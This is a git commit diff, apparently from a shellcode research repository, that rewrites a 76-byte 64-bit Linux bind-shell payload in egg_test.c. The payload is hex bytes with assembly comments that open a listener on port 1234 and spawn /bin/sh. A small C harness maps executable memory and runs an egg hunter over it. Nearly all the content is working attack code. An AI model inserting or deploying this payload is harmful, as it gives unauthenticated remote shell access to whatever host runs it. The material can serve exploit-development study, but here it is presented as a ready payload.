63bd801052f91a53b3863380f431fda1b8535a03
Odzhan <odzhan@protonmail.com>
2017-02-23 02:01:10 +0000

    upd

--- linux/egg_test.c
+++ linux/egg_test.c
@@ -100,51 +100,47 @@ char EGG64[] = {
 // sig is 0xDEADCODE
 #define EGG_SIG "\xDE\xC0\xAD\xDE"
 
-// 64-bit bind shell for 0.0.0.0:1234
+// 76-byte 64-bit bind shell for 0.0.0.0:1234
 char BS[] = {
   EGG_SIG
   EGG_SIG
-  /* 0000 */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
-  /* 000A */ "\x48\xf7\xd0"                             /* not rax                     */
-  /* 000D */ "\x50"                                     /* push rax                    */
-  /* 000E */ "\x54"                                     /* push rsp                    */
-  /* 000F */ "\x5d"                                     /* pop rbp                     */
-  /* 0010 */ "\x6a\x29"                                 /* push 0x29                   */
-  /* 0012 */ "\x58"                                     /* pop rax                     */
-  /* 0013 */ "\x99"                                     /* cdq                         */
-  /* 0014 */ "\x6a\x01"                                 /* push 0x1                    */
-  /* 0016 */ "\x5e"                                     /* pop rsi                     */
-  /* 0017 */ "\x6a\x02"                                 /* push 0x2                    */
-  /* 0019 */ "\x5f"                                     /* pop rdi                     */
-  /* 001A */ "\x0f\x05"                                 /* syscall                     */
-  /* 001C */ "\x97"                                     /* xchg edi, eax               */
-  /* 001D */ "\x55"                                     /* push rbp                    */
-  /* 001E */ "\x5e"                                     /* pop rsi                     */
-  /* 001F */ "\xb2\x10"                                 /* mov dl, 0x10                */
-  /* 0021 */ "\xb0\x31"                                 /* mov al, 0x31                */
-  /* 0023 */ "\x0f\x05"                                 /* syscall                     */
-  /* 0025 */ "\x50"                                     /* push rax                    */
-  /* 0026 */ "\x5e"                                     /* pop rsi                     */
-  /* 0027 */ "\xb0\x32"                                 /* mov al, 0x32                */
-  /* 0029 */ "\x0f\x05"                                 /* syscall                     */
-  /* 002B */ "\xb0\x2b"                                 /* mov al, 0x2b                */
-  /* 002D */ "\x0f\x05"                                 /* syscall                     */
-  /* 002F */ "\x97"                                     /* xchg edi, eax               */
-  /* 0030 */ "\x96"                                     /* xchg esi, eax               */
-  /* 0031 */ "\x6a\x21"                                 /* push 0x21                   */
-  /* 0033 */ "\x58"                                     /* pop rax                     */
-  /* 0034 */ "\x0f\x05"                                 /* syscall                     */
-  /* 0036 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
-  /* 0039 */ "\x79\xf6"                                 /* jns 0x31                    */
-  /* 003B */ "\x99"                                     /* cdq                         */
-  /* 003C */ "\x31\xf6"                                 /* xor esi, esi                */
-  /* 003E */ "\x52"                                     /* push rdx                    */
-  /* 003F */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
-  /* 0049 */ "\x51"                                     /* push rcx                    */
-  /* 004A */ "\x54"                                     /* push rsp                    */
-  /* 004B */ "\x5f"                                     /* pop rdi                     */
-  /* 004C */ "\xb0\x3b"                                 /* mov al, 0x3b                */
-  /* 004E */ "\x0f\x05"                                 /* syscall                     */
+  /* 0000 */ "\x6a\x29"                                 /* push 0x29                   */
+  /* 0002 */ "\x58"                                     /* pop rax                     */
+  /* 0003 */ "\x6a\x01"                                 /* push 0x1                    */
+  /* 0005 */ "\x5e"                                     /* pop rsi                     */
+  /* 0006 */ "\x6a\x02"                                 /* push 0x2                    */
+  /* 0008 */ "\x5f"                                     /* pop rdi                     */
+  /* 0009 */ "\x99"                                     /* cdq                         */
+  /* 000A */ "\x0f\x05"                                 /* syscall                     */
+  /* 000C */ "\x97"                                     /* xchg edi, eax               */
+  /* 000D */ "\x48\xb8\xfd\xff\xfb\x2d\xff\xff\xff\xff" /* mov rax, 0xffffffff2dfbfffd */
+  /* 0017 */ "\x48\xf7\xd0"                             /* not rax                     */
+  /* 001A */ "\x50"                                     /* push rax                    */
+  /* 001B */ "\x54"                                     /* push rsp                    */
+  /* 001C */ "\x5e"                                     /* pop rsi                     */
+  /* 001D */ "\xb2\x10"                                 /* mov dl, 0x10                */
+  /* 001F */ "\xb0\x31"                                 /* mov al, 0x31                */
+  /* 0021 */ "\x0f\x05"                                 /* syscall                     */
+  /* 0023 */ "\x96"                                     /* xchg esi, eax               */
+  /* 0024 */ "\xb0\x32"                                 /* mov al, 0x32                */
+  /* 0026 */ "\x0f\x05"                                 /* syscall                     */
+  /* 0028 */ "\xb0\x2b"                                 /* mov al, 0x2b                */
+  /* 002A */ "\x0f\x05"                                 /* syscall                     */
+  /* 002C */ "\x97"                                     /* xchg edi, eax               */
+  /* 002D */ "\x96"                                     /* xchg esi, eax               */
+  /* 002E */ "\xb0\x21"                                 /* mov al, 0x21                */
+  /* 0030 */ "\x0f\x05"                                 /* syscall                     */
+  /* 0032 */ "\x83\xee\x01"                             /* sub esi, 0x1                */
+  /* 0035 */ "\x79\xf7"                                 /* jns 0x2e                    */
+  /* 0037 */ "\x31\xf6"                                 /* xor esi, esi                */
+  /* 0039 */ "\x52"                                     /* push rdx                    */
+  /* 003A */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
+  /* 0044 */ "\x51"                                     /* push rcx                    */
+  /* 0045 */ "\x54"                                     /* push rsp                    */
+  /* 0046 */ "\x5f"                                     /* pop rdi                     */
+  /* 0047 */ "\x99"                                     /* cdq                         */
+  /* 0048 */ "\xb0\x3b"                                 /* mov al, 0x3b                */
+  /* 004A */ "\x0f\x05"                                 /* syscall                     */
 };
 
 void xcode(char *s, int len)
@@ -165,14 +161,14 @@ void xcode(char *s, int len)
 
 int main(int argc, char *argv[])
 {
-  uint8_t *sc=(uint8_t*)mmap (0, sizeof(BS), 
+  uint8_t *sc=(uint8_t*)mmap (0, sizeof(SHX), 
       PROT_EXEC | PROT_WRITE | PROT_READ, 
       MAP_ANON  | MAP_PRIVATE, -1, 0); 
       
   if (sc != NULL) {
-    memcpy (sc, BS, sizeof(BS));    
+    memcpy (sc, SHX, sizeof(SHX));    
     xcode (EGG64, EGG64_SIZE);
-    munmap((void*)sc, sizeof(BS));
+    munmap((void*)sc, sizeof(SHX));
   }
   return 0;  
 }
